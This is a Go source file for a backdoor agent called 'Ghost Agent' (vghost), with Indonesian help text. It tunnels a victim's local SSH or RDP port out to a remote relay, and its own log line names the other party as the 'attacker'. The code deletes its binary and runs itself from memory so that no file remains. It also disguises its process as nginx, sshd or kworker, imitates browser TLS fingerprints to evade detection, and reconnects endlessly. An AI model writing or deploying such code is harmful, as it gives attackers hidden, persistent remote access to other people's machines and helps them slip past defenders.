package main

import (
	"context"
	"flag"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"time"

	"github.com/blackopsbos/svenom/pkg/evasion"
	"github.com/blackopsbos/svenom/pkg/masquerade"
	"github.com/blackopsbos/svenom/pkg/memfd"
)

var (
	secretKey  = flag.String("Sk", "", "Secret key untuk otentikasi (wajib)")
	domain     = flag.String("d", "", "Domain atau IP relay server (wajib)")
	relayPort  = flag.String("P", "443", "Port relay server")
	localPort  = flag.String("p", "22", "Port lokal yang akan diekspos")
	mimic      = flag.String("mimic", "chrome", "Profil browser untuk TLS mimicry (chrome, firefox, safari, edge)")
	noTLS      = flag.Bool("no-tls", false, "Matikan TLS (untuk testing)")
	retryMax   = flag.Int("retry", 0, "Maksimum percobaan koneksi ulang (0 = tak terbatas)")
	retryDelay = flag.Int("retry-delay", 5, "Delay antar percobaan dalam detik")
	help       = flag.Bool("h", false, "Tampilkan bantuan")
)

func printHelp() {
	fmt.Println(`
██╗   ██╗ ██████╗ ██╗  ██╗ ██████╗ ███████╗████████╗
██║   ██║██╔════╝ ██║  ██║██╔═══██╗██╔════╝╚══██╔══╝
██║   ██║██║  ███╗███████║██║   ██║███████╗   ██║   
╚██╗ ██╔╝██║   ██║██╔══██║██║   ██║╚════██║   ██║   
 ╚████╔╝ ╚██████╔╝██║  ██║╚██████╔╝███████║   ██║   
  ╚═══╝   ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝   

Ghost Agent - Menghubungkan port lokal ke relay server secara fileless.
`)
	fmt.Println("Penggunaan:")
	fmt.Println("  vghost --Sk <secret> -d <domain> [opsi]")
	fmt.Println()
	fmt.Println("Opsi:")
	flag.PrintDefaults()
	fmt.Println()
	fmt.Println("Contoh:")
	fmt.Println("  vghost --Sk abc123 -d namadomain.com")
	fmt.Println("  vghost --Sk abc123 -d namadomain.com -p 3389 --mimic firefox")
	fmt.Println()
}

func main() {
	flag.Parse()

	if *help {
		printHelp()
		return
	}

	if *secretKey == "" || *domain == "" {
		fmt.Fprintf(os.Stderr, "Error: --Sk dan -d harus diisi. Gunakan -h untuk bantuan.\n")
		os.Exit(1)
	}

	// Fileless execution
	self, err := os.ReadFile(os.Args[0])
	if err == nil {
		os.Remove(os.Args[0])
		if err := memfd.ExecuteInMemory(self, os.Args, os.Environ()); err != nil {
			log.Printf("memfd fallback: %v", err)
		} else {
			return
		}
	}

	// Masquerade
	masks := []string{"nginx", "sshd", "systemd-journal", "kworker/u8:1"}
	maskName := masks[time.Now().Unix()%int64(len(masks))]
	masquerade.DisguiseAs(maskName, fmt.Sprintf("/usr/sbin/%s --daemon", maskName))

	evMgr := evasion.NewManager(evasion.BrowserProfile(*mimic))
	addr := net.JoinHostPort(*domain, *relayPort)
	retries := 0

	for {
		log.Printf("Menghubungkan ke %s (percobaan ke-%d)", addr, retries+1)

		var conn net.Conn
		if *noTLS {
			conn, err = evMgr.DialDirect(context.Background(), "tcp", addr)
		} else {
			conn, err = evMgr.DialContext(context.Background(), "tcp", addr)
		}
		if err != nil {
			log.Printf("Gagal menghubungi relay: %v", err)
			retries++
			if *retryMax > 0 && retries >= *retryMax {
				log.Fatal("Batas maksimum percobaan tercapai.")
			}
			time.Sleep(time.Duration(*retryDelay) * time.Second)
			continue
		}

		fmt.Fprintf(conn, "%s\n", *secretKey)
		log.Printf("Terhubung ke relay, menunggu pasangan (attacker)...")

		localConn, err := net.DialTimeout("tcp", net.JoinHostPort("127.0.0.1", *localPort), 10*time.Second)
		if err != nil {
			log.Printf("Layanan lokal di port %s tidak dapat dijangkau: %v", *localPort, err)
			conn.Close()
			time.Sleep(time.Duration(*retryDelay) * time.Second)
			continue
		}

		go io.Copy(localConn, conn)
		io.Copy(conn, localConn)
		localConn.Close()
		conn.Close()
		log.Printf("Koneksi terputus, mencoba lagi...")
		retries = 0
		time.Sleep(1 * time.Second)
	}
}